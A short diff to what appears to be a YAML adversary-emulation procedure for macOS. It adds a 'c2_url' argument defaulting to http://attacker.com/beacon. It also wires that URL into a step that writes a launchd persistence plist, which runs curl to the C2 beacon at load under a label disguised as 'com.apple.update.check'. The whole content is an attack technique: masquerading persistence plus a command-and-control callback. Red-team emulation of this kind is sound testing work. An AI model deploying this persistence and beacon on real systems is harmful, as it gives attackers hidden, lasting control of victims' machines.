@@ -25,6 +25,10 @@ args:
   description: Label of the service to load
   type: string
   default: com.apple.update.check
+- name: c2_url
+  description: C2 server URL for beacon callback
+  type: string
+  default: http://attacker.com/beacon
 steps:
 - name: create_persistence_plist
   create_file: '{{ .Args.plist_path }}'
@@ -38,7 +42,7 @@ steps:
         <key>ProgramArguments</key>
         <array>
             <string>/usr/bin/curl</string>
-            <string>http://attacker.com/beacon</string>
+            <string>{{ .Args.c2_url }}</string>
         </array>
         <key>RunAtLoad</key>
         <true/>
